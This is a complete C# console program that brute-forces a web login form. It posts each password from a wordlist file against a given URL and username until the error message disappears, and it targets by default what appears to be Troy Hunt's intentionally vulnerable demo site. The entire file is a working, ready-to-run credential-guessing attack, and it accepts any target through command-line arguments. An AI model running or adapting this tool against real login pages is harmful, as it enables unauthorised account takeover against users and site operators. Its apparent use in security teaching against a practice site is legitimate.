using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace PasswordBruteForcer
{
  class Program
  {
    static void Main(string[] args)
    {
      var logonPath = "https://hackyourselffirst.troyhunt.com/Account/Login";
      var username = "troyhunt@hotmail.com";

      if (args.Length == 2)
      {
        logonPath = args[0];
        username = args[1];
      }

      Console.WriteLine();
      Console.WriteLine("Testing username {0} at logon path: {1}", username, logonPath);
      Console.WriteLine();
      Thread.Sleep(1000);

      using (var sr = new StreamReader("Passwords.txt"))
      {
        String password;
        while ((password = sr.ReadLine()) != null)
        {
          Console.WriteLine("Testing password: {0}", password);
          Thread.Sleep(10);

          var postData = string.Format("Email={0}&Password={1}", username, password);

          var req = (HttpWebRequest)WebRequest.Create(logonPath);
          req.Method = "POST";

          var byteArray = Encoding.UTF8.GetBytes(postData);
          req.ContentType = "application/x-www-form-urlencoded";
          req.ContentLength = byteArray.Length;
          var dataStream = req.GetRequestStream();
          dataStream.Write(byteArray, 0, byteArray.Length);
          dataStream.Close();

          string respBody;
          try
          {
            using (var resp = (HttpWebResponse)req.GetResponse())
            {
              respBody = GetResponseBody(resp);
            }
          }
          catch (WebException e)
          {
            respBody = GetResponseBody((HttpWebResponse)e.Response);
          }

          if (respBody.Contains("The email or password provided is incorrect"))
          {
            Console.WriteLine("Incorrect password");
            Console.WriteLine();
          }
          else
          {
            Console.WriteLine("Password found!");
            Console.ReadLine();
            return;
          }
        }

        Console.WriteLine("Could not find a password");
      }
    }

    private static string GetResponseBody(HttpWebResponse resp)
    {
      using (var respStream = new StreamReader(resp.GetResponseStream()))
      {
        return respStream.ReadToEnd();
      }
    }
  }
}
